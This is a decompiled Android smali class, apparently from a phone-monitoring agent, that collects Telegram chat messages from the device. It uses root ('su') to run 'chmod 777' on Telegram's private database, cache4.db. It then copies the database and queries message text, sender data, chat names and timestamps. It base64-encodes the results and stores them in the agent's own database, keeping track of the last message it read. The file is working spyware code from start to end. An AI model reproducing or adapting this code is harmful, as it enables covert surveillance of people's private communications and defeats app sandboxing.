.class public Lcom/hp/vd/module/monitor/telegram/TelegramMessageExtractor;
.super Ljava/lang/Object;
.source "TelegramMessageExtractor.java"

# interfaces
.implements Ljava/lang/Runnable;


# static fields
.field protected static final TAG:Ljava/lang/String; = "TgMsgExtractor"

.field protected static final TEMP_FILE_NAME_PREFIX:Ljava/lang/String; = "tgMsgTemp"


# instance fields
.field protected context:Lcom/hp/vd/context/Context;

.field protected log:Lcom/hp/vd/agent/log/IWriter;

.field protected moduleData:Lcom/hp/vd/data/ModuleData;

.field protected telegramMessageDao:Lcom/j256/ormlite/dao/Dao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/TelegramMessageData;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation
.end field


# direct methods
.method public constructor <init>(Lcom/hp/vd/context/Context;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/data/ModuleData;Lcom/hp/vd/agent/log/IWriter;)V
    .locals 1
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Lcom/hp/vd/context/Context;",
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/TelegramMessageData;",
            "Ljava/lang/Integer;",
            ">;",
            "Lcom/hp/vd/data/ModuleData;",
            "Lcom/hp/vd/agent/log/IWriter;",
            ")V"
        }
    .end annotation

    .line 39
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    const/4 v0, 0x0

    .line 34
    iput-object v0, p0, Lcom/hp/vd/module/monitor/telegram/TelegramMessageExtractor;->context:Lcom/hp/vd/context/Context;

    .line 35
    iput-object v0, p0, Lcom/hp/vd/module/monitor/telegram/TelegramMessageExtractor;->telegramMessageDao:Lcom/j256/ormlite/dao/Dao;

    .line 36
    iput-object v0, p0, Lcom/hp/vd/module/monitor/telegram/TelegramMessageExtractor;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 37
    iput-object v0, p0, Lcom/hp/vd/module/monitor/telegram/TelegramMessageExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    .line 40
    iput-object p1, p0, Lcom/hp/vd/module/monitor/telegram/TelegramMessageExtractor;->context:Lcom/hp/vd/context/Context;

    .line 41
    iput-object p2, p0, Lcom/hp/vd/module/monitor/telegram/TelegramMessageExtractor;->telegramMessageDao:Lcom/j256/ormlite/dao/Dao;

    .line 42
    iput-object p3, p0, Lcom/hp/vd/module/monitor/telegram/TelegramMessageExtractor;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 43
    iput-object p4, p0, Lcom/hp/vd/module/monitor/telegram/TelegramMessageExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    return-void
.end method


# virtual methods
.method protected chmod(Ljava/lang/String;Ljava/lang/Boolean;)Z
    .locals 4

    .line 253
    iget-object v0, p0, Lcom/hp/vd/module/monitor/telegram/TelegramMessageExtractor;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v0

    .line 256
    :try_start_0
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v1

    const-string v2, "su"

    invoke-virtual {v1, v2}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;

    move-result-object v1

    .line 257
    new-instance v2, Ljava/io/DataOutputStream;

    invoke-virtual {v1}, Ljava/lang/Process;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v3

    invoke-direct {v2, v3}, Ljava/io/DataOutputStream;-><init>(Ljava/io/OutputStream;)V

    .line 260
    invoke-virtual {p2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result p2

    if-eqz p2, :cond_0

    .line 261
    new-instance p2, Ljava/lang/StringBuilder;

    invoke-direct {p2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "chmod -R 777 "

    invoke-virtual {p2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p1, "\n"

    invoke-virtual {p2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v2, p1}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    goto :goto_0

    .line 264
    :cond_0
    new-instance p2, Ljava/lang/StringBuilder;

    invoke-direct {p2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "chmod 777 "

    invoke-virtual {p2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p1, "\n"

    invoke-virtual {p2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v2, p1}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 267
    :goto_0
    invoke-virtual {v2}, Ljava/io/DataOutputStream;->flush()V

    const-string p1, "exit\n"

    .line 269
    invoke-virtual {v2, p1}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 270
    invoke-virtual {v2}, Ljava/io/DataOutputStream;->flush()V

    .line 272
    invoke-virtual {v1}, Ljava/lang/Process;->waitFor()I
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0

    const/4 p1, 0x1

    return p1

    :catch_0
    move-exception p1

    const-string p2, "TgMsgExtractor"

    const-string v1, "chmod(): InterruptedException"

    .line 280
    invoke-interface {v0, p2, v1, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    goto :goto_1

    :catch_1
    move-exception p1

    const-string p2, "TgMsgExtractor"

    const-string v1, "chmod(): IOException"

    .line 277
    invoke-interface {v0, p2, v1, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    :goto_1
    const/4 p1, 0x0

    return p1
.end method

.method protected cleanTempFilesFromPreviousInvocations(Ljava/lang/String;)V
    .locals 3

    .line 336
    :try_start_0
    new-instance v0, Ljava/io/File;

    iget-object v1, p0, Lcom/hp/vd/module/monitor/telegram/TelegramMessageExtractor;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v1}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-virtual {v1}, Landroid/content/Context;->getCacheDir()Ljava/io/File;

    move-result-object v1

    invoke-virtual {v1}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 337
    new-instance v1, Lcom/hp/vd/module/monitor/telegram/StartsWithFilenameFilter;

    invoke-direct {v1, p1}, Lcom/hp/vd/module/monitor/telegram/StartsWithFilenameFilter;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, v1}, Ljava/io/File;->listFiles(Ljava/io/FilenameFilter;)[Ljava/io/File;

    move-result-object p1

    .line 339
    array-length v0, p1

    const/4 v1, 0x0

    :goto_0
    if-ge v1, v0, :cond_0

    aget-object v2, p1, v1

    .line 340
    invoke-virtual {v2}, Ljava/io/File;->delete()Z
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    add-int/lit8 v1, v1, 0x1

    goto :goto_0

    :catch_0
    move-exception p1

    .line 344
    iget-object v0, p0, Lcom/hp/vd/module/monitor/telegram/TelegramMessageExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v1, "TgMsgExtractor"

    const-string v2, "Throwable caught while deleting temp files from previous invocation at"

    invoke-interface {v0, v1, v2, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    :cond_0
    return-void
.end method

.method public copy(Ljava/io/File;Ljava/io/File;)V
    .locals 7
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/io/IOException;
        }
    .end annotation

    .line 321
    new-instance v0, Ljava/io/FileInputStream;

    invoke-direct {v0, p1}, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V

    .line 322
    new-instance p1, Ljava/io/FileOutputStream;

    invoke-direct {p1, p2}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V

    .line 324
    invoke-virtual {v0}, Ljava/io/FileInputStream;->getChannel()Ljava/nio/channels/FileChannel;

    move-result-object v1

    .line 325
    invoke-virtual {p1}, Ljava/io/FileOutputStream;->getChannel()Ljava/nio/channels/FileChannel;

    move-result-object v6

    .line 327
    invoke-virtual {v1}, Ljava/nio/channels/FileChannel;->size()J

    move-result-wide v4

    const-wide/16 v2, 0x0

    invoke-virtual/range {v1 .. v6}, Ljava/nio/channels/FileChannel;->transferTo(JJLjava/nio/channels/WritableByteChannel;)J

    .line 329
    invoke-virtual {v0}, Ljava/io/FileInputStream;->close()V

    .line 330
    invoke-virtual {p1}, Ljava/io/FileOutputStream;->close()V

    return-void
.end method

.method protected detectDatabaseFiles()Ljava/lang/String;
    .locals 6

    const-string v0, "/data/data/org.telegram.messenger/files/cache4.db"

    .line 212
    invoke-virtual {p0, v0}, Lcom/hp/vd/module/monitor/telegram/TelegramMessageExtractor;->isReadable(Ljava/lang/String;)Z

    move-result v1

    if-nez v1, :cond_0

    const/4 v1, 0x0

    .line 213
    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    invoke-virtual {p0, v0, v1}, Lcom/hp/vd/module/monitor/telegram/TelegramMessageExtractor;->chmod(Ljava/lang/String;Ljava/lang/Boolean;)Z

    .line 216
    :cond_0
    new-instance v1, Ljava/io/File;

    invoke-direct {v1, v0}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 219
    invoke-virtual {v1}, Ljava/io/File;->isFile()Z

    move-result v2

    if-eqz v2, :cond_2

    invoke-virtual {v1}, Ljava/io/File;->length()J

    move-result-wide v1

    const-wide/16 v3, 0x0

    cmp-long v5, v1, v3

    if-nez v5, :cond_1

    goto :goto_0

    :cond_1
    return-object v0

    :cond_2
    :goto_0
    const/4 v0, 0x0

    return-object v0
.end method

.method protected extractMessages(Landroid/database/sqlite/SQLiteDatabase;)V
    .locals 8

    .line 120
    iget-object v0, p0, Lcom/hp/vd/module/monitor/telegram/TelegramMessageExtractor;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v1, "tg_max_id"

    const/4 v2, 0x0

    invoke-virtual {p0, v0, v1, v2}, Lcom/hp/vd/module/monitor/telegram/TelegramMessageExtractor;->safeExtractInt(Lcom/hp/vd/data/ModuleData;Ljava/lang/String;I)Ljava/lang/Integer;

    move-result-object v0

    .line 126
    iget-object v1, p0, Lcom/hp/vd/module/monitor/telegram/TelegramMessageExtractor;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v3, "max_length"

    const/16 v4, 0x200

    invoke-virtual {p0, v1, v3, v4}, Lcom/hp/vd/module/monitor/telegram/TelegramMessageExtractor;->safeExtractInt(Lcom/hp/vd/data/ModuleData;Ljava/lang/String;I)Ljava/lang/Integer;

    move-result-object v1

    .line 132
    new-instance v3, Lcom/hp/vd/module/monitor/telegram/Columns;

    invoke-direct {v3}, Lcom/hp/vd/module/monitor/telegram/Columns;-><init>()V

    :try_start_0
    const-string v4, "SELECT m.mid, m.out, u.data as user_data, c.name chat_name, m.data, m.date FROM messages m LEFT JOIN users u ON u.uid = m.uid LEFT JOIN chats c ON c.uid = (-m.uid) WHERE m.mid > ? AND LENGTH(m.data) < ? ORDER BY m.mid asc LIMIT ?"

    const/4 v5, 0x3

    .line 137
    new-array v6, v5, [Ljava/lang/String;

    .line 140
    invoke-virtual {v0}, Ljava/lang/Integer;->toString()Ljava/lang/String;

    move-result-object v7

    aput-object v7, v6, v2

    const/4 v7, 0x1

    .line 141
    invoke-virtual {v1}, Ljava/lang/Integer;->toString()Ljava/lang/String;

    move-result-object v1

    aput-object v1, v6, v7

    const/4 v1, 0x2

    const-string v7, "300"

    aput-object v7, v6, v1

    .line 137
    invoke-virtual {p1, v4, v6}, Landroid/database/sqlite/SQLiteDatabase;->rawQuery(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object p1

    if-nez p1, :cond_0

    .line 147
    iget-object p1, p0, Lcom/hp/vd/module/monitor/telegram/TelegramMessageExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v0, "TgMsgExtractor"

    const-string v1, "Message Cursor is null."

    invoke-interface {p1, v0, v1, v5}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    return-void

    :cond_0
    if-eqz p1, :cond_3

    move-object v1, v0

    .line 153
    :goto_0
    invoke-interface {p1}, Landroid/database/Cursor;->moveToNext()Z

    move-result v4

    if-eqz v4, :cond_4

    .line 154
    new-instance v1, Lcom/hp/vd/data/TelegramMessageData;

    invoke-direct {v1}, Lcom/hp/vd/data/TelegramMessageData;-><init>()V

    .line 156
    invoke-virtual {v3}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v4, "mid"

    invoke-interface {p1, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    invoke-interface {p1, v4}, Landroid/database/Cursor;->getInt(I)I

    move-result v4

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    iput-object v4, v1, Lcom/hp/vd/data/TelegramMessageData;->internalId:Ljava/lang/Integer;

    .line 157
    invoke-virtual {v3}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v4, "out"

    invoke-interface {p1, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    invoke-interface {p1, v4}, Landroid/database/Cursor;->getInt(I)I

    move-result v4

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    iput-object v4, v1, Lcom/hp/vd/data/TelegramMessageData;->out:Ljava/lang/Integer;

    .line 159
    invoke-virtual {v3}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v4, "date"

    invoke-interface {p1, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    invoke-interface {p1, v4}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v4

    invoke-static {v4, v5}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v4

    .line 160
    invoke-virtual {v4}, Ljava/lang/Long;->longValue()J

    move-result-wide v4

    const-wide/16 v6, 0x3e8

    mul-long/2addr v4, v6

    invoke-static {v4, v5}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v4

    .line 161
    new-instance v5, Ljava/util/Date;

    invoke-virtual {v4}, Ljava/lang/Long;->longValue()J

    move-result-wide v6

    invoke-direct {v5, v6, v7}, Ljava/util/Date;-><init>(J)V

    iput-object v5, v1, Lcom/hp/vd/data/TelegramMessageData;->createdAt:Ljava/util/Date;

    .line 163
    invoke-virtual {v3}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v4, "user_data"

    invoke-interface {p1, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    invoke-interface {p1, v4}, Landroid/database/Cursor;->getBlob(I)[B

    move-result-object v4

    if-eqz v4, :cond_1

    .line 164
    array-length v5, v4

    if-lez v5, :cond_1

    .line 165
    invoke-static {v4, v2}, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;

    move-result-object v4

    iput-object v4, v1, Lcom/hp/vd/data/TelegramMessageData;->userData:Ljava/lang/String;

    .line 168
    :cond_1
    invoke-virtual {v3}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v4, "chat_name"

    invoke-interface {p1, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    invoke-interface {p1, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v4

    iput-object v4, v1, Lcom/hp/vd/data/TelegramMessageData;->chatName:Ljava/lang/String;

    .line 170
    invoke-virtual {v3}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v4, "data"

    invoke-interface {p1, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    invoke-interface {p1, v4}, Landroid/database/Cursor;->getBlob(I)[B

    move-result-object v4

    if-eqz v4, :cond_2

    .line 171
    array-length v5, v4

    if-lez v5, :cond_2

    .line 172
    invoke-static {v4, v2}, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;

    move-result-object v4

    iput-object v4, v1, Lcom/hp/vd/data/TelegramMessageData;->data:Ljava/lang/String;

    .line 179
    :cond_2
    iget-object v4, p0, Lcom/hp/vd/module/monitor/telegram/TelegramMessageExtractor;->telegramMessageDao:Lcom/j256/ormlite/dao/Dao;

    invoke-interface {v4, v1}, Lcom/j256/ormlite/dao/Dao;->create(Ljava/lang/Object;)I

    .line 181
    iget-object v1, v1, Lcom/hp/vd/data/TelegramMessageData;->internalId:Ljava/lang/Integer;

    goto/16 :goto_0

    :cond_3
    move-object v1, v0

    .line 185
    :cond_4
    invoke-interface {p1}, Landroid/database/Cursor;->close()V

    if-eq v0, v1, :cond_5

    .line 192
    iget-object p1, p0, Lcom/hp/vd/module/monitor/telegram/TelegramMessageExtractor;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v0, "tg_max_id"

    invoke-virtual {p1, v0, v1}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/Integer;)V

    .line 197
    iget-object p1, p0, Lcom/hp/vd/module/monitor/telegram/TelegramMessageExtractor;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {p1}, Lcom/hp/vd/context/Context;->getHelper()Lcom/hp/vd/data/persistency/DatabaseHelper;

    move-result-object p1

    invoke-virtual {p1}, Lcom/hp/vd/data/persistency/DatabaseHelper;->getModuleDao()Lcom/j256/ormlite/dao/Dao;

    move-result-object p1

    .line 198
    iget-object v0, p0, Lcom/hp/vd/module/monitor/telegram/TelegramMessageExtractor;->moduleData:Lcom/hp/vd/data/ModuleData;

    invoke-interface {p1, v0}, Lcom/j256/ormlite/dao/Dao;->update(Ljava/lang/Object;)I
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    :cond_5
    return-void

    :catch_0
    move-exception p1

    .line 201
    iget-object v0, p0, Lcom/hp/vd/module/monitor/telegram/TelegramMessageExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v1, "TgMsgExtractor"

    const-string v2, "Error extracting data."

    invoke-interface {v0, v1, v2, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return-void
.end method

.method public isReadable(Ljava/lang/String;)Z
    .locals 1

    .line 246
    new-instance v0, Ljava/io/File;

    invoke-direct {v0, p1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 248
    invoke-virtual {v0}, Ljava/io/File;->canRead()Z

    move-result p1

    return p1
.end method

.method protected prepareDatabase(Ljava/io/File;Ljava/io/File;)Landroid/database/sqlite/SQLiteDatabase;
    .locals 4

    const/4 v0, 0x0

    .line 293
    :try_start_0
    invoke-virtual {p0, p1, p2}, Lcom/hp/vd/module/monitor/telegram/TelegramMessageExtractor;->copy(Ljava/io/File;Ljava/io/File;)V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_1

    .line 307
    :try_start_1
    invoke-virtual {p2}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object p1

    const/16 v1, 0x10

    invoke-static {p1, v0, v1}, Landroid/database/sqlite/SQLiteDatabase;->openDatabase(Ljava/lang/String;Landroid/database/sqlite/SQLiteDatabase$CursorFactory;I)Landroid/database/sqlite/SQLiteDatabase;

    move-result-object p1
    :try_end_1
    .catch Landroid/database/sqlite/SQLiteException; {:try_start_1 .. :try_end_1} :catch_0

    return-object p1

    :catch_0
    move-exception p1

    .line 310
    iget-object v1, p0, Lcom/hp/vd/module/monitor/telegram/TelegramMessageExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "TgMsgExtractor"

    const-string v3, "Exception caught while opening database."

    invoke-interface {v1, v2, v3, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    .line 311
    invoke-virtual {p2}, Ljava/io/File;->delete()Z

    return-object v0

    :catch_1
    move-exception p1

    .line 295
    iget-object p2, p0, Lcom/hp/vd/module/monitor/telegram/TelegramMessageExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v1, "TgMsgExtractor"

    const-string v2, "prepareDatabase(): Exception caught during coping database to a temporary location."

    invoke-interface {p2, v1, v2, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return-object v0
.end method

.method public run()V
    .locals 8

    const-string v0, "tgMsgTemp"

    .line 52
    invoke-virtual {p0, v0}, Lcom/hp/vd/module/monitor/telegram/TelegramMessageExtractor;->cleanTempFilesFromPreviousInvocations(Ljava/lang/String;)V

    .line 57
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/telegram/TelegramMessageExtractor;->detectDatabaseFiles()Ljava/lang/String;

    move-result-object v0

    if-nez v0, :cond_0

    .line 60
    iget-object v0, p0, Lcom/hp/vd/module/monitor/telegram/TelegramMessageExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v1, "TgMsgExtractor"

    const-string v2, "No database detected."

    const/4 v3, 0x1

    invoke-interface {v0, v1, v2, v3}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    return-void

    .line 65
    :cond_0
    new-instance v1, Ljava/io/File;

    invoke-direct {v1, v0}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    const/4 v0, 0x0

    :try_start_0
    const-string v2, "tgMsgTemp"

    const-string v3, "db"

    .line 75
    iget-object v4, p0, Lcom/hp/vd/module/monitor/telegram/TelegramMessageExtractor;->context:Lcom/hp/vd/context/Context;

    .line 78
    invoke-virtual {v4}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v4

    invoke-virtual {v4}, Landroid/content/Context;->getCacheDir()Ljava/io/File;

    move-result-object v4

    invoke-virtual {v4}, Ljava/io/File;->getAbsoluteFile()Ljava/io/File;

    move-result-object v4

    .line 75
    invoke-static {v2, v3, v4}, Ljava/io/File;->createTempFile(Ljava/lang/String;Ljava/lang/String;Ljava/io/File;)Ljava/io/File;

    move-result-object v2
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_2

    .line 81
    :try_start_1
    invoke-virtual {p0, v1, v2}, Lcom/hp/vd/module/monitor/telegram/TelegramMessageExtractor;->copy(Ljava/io/File;Ljava/io/File;)V
    :try_end_1
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_1

    .line 95
    :try_start_2
    invoke-virtual {v2}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v1

    const/16 v3, 0x10

    invoke-static {v1, v0, v3}, Landroid/database/sqlite/SQLiteDatabase;->openDatabase(Ljava/lang/String;Landroid/database/sqlite/SQLiteDatabase$CursorFactory;I)Landroid/database/sqlite/SQLiteDatabase;

    move-result-object v0
    :try_end_2
    .catch Landroid/database/sqlite/SQLiteException; {:try_start_2 .. :try_end_2} :catch_0

    .line 108
    invoke-virtual {p0, v0}, Lcom/hp/vd/module/monitor/telegram/TelegramMessageExtractor;->extractMessages(Landroid/database/sqlite/SQLiteDatabase;)V

    if-eqz v0, :cond_1

    .line 111
    invoke-virtual {v0}, Landroid/database/sqlite/SQLiteDatabase;->close()V

    :cond_1
    if-eqz v2, :cond_2

    .line 114
    invoke-virtual {v2}, Ljava/io/File;->delete()Z

    :cond_2
    return-void

    :catch_0
    move-exception v0

    .line 97
    iget-object v1, p0, Lcom/hp/vd/module/monitor/telegram/TelegramMessageExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v3, "TgMsgExtractor"

    const-string v4, "Exception caught while opening database."

    invoke-interface {v1, v3, v4, v0}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    .line 99
    invoke-virtual {v2}, Ljava/io/File;->delete()Z

    return-void

    :catch_1
    move-exception v0

    move-object v7, v2

    move-object v2, v0

    move-object v0, v7

    goto :goto_0

    :catch_2
    move-exception v2

    .line 83
    :goto_0
    iget-object v3, p0, Lcom/hp/vd/module/monitor/telegram/TelegramMessageExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v4, "TgMsgExtractor"

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "Exception copying the temp database from:"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v5, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v1, ", to: "

    invoke-virtual {v5, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-interface {v3, v4, v0, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return-void
.end method

.method protected safeExtractInt(Lcom/hp/vd/data/ModuleData;Ljava/lang/String;I)Ljava/lang/Integer;
    .locals 0

    .line 229
    invoke-virtual {p1, p2}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    if-eqz p1, :cond_0

    .line 233
    :try_start_0
    invoke-static {p1}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result p1
    :try_end_0
    .catch Ljava/lang/NumberFormatException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    :cond_0
    move p1, p3

    .line 241
    :goto_0
    invoke-static {p1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object p1

    return-object p1
.end method
